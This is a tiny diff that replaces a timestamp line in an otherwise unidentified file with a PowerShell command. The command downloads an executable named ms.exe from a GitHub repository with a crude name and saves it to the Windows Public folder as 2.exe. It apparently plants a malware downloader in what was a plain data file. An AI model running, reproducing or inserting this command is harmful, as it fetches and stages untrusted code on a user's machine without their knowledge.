@@ -1,1 +1,1 @@
-2020-05-26 17:56:32
+powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/fuck123fuckabc/test/raw/master/ms.exe','c:\\users\\public\\2.exe')
